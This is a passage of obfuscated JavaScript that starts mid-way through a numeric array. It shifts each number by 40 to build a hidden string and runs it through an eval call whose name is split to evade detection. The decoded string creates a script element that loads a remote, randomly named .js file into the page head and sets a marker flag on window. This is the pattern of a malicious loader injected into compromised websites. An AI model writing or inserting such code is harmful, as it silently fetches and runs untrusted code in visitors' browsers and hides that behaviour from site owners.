68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i-31i85i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i71i70i68i71i57i60i-8i21i-8i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i75i74i59i-8i21i-8i77i74i68i-8i3i-8i37i57i76i64i6i74i57i70i60i71i69i0i1i6i76i71i43i76i74i65i70i63i0i1i6i75i77i58i75i76i74i65i70i63i0i11i1i-8i3i-8i-1i6i66i75i-1i19i-27i-30i-31i-31i-31i64i61i57i60i6i57i72i72i61i70i60i27i64i65i68i60i0i75i59i74i65i72i76i1i19i-27i-30i-31i-31i85i-27i-30i-31i85i19i-27i-30i85i1i0i1i19'][0].split('i');v="ev"+"al";}if(v)e=window[v];w=f;s=[];r=String;for(;691!=i;i+=1){j=i;s+=r["fromC"+"harCode"](40+1*w[j]);}if(f)z=s;e(z);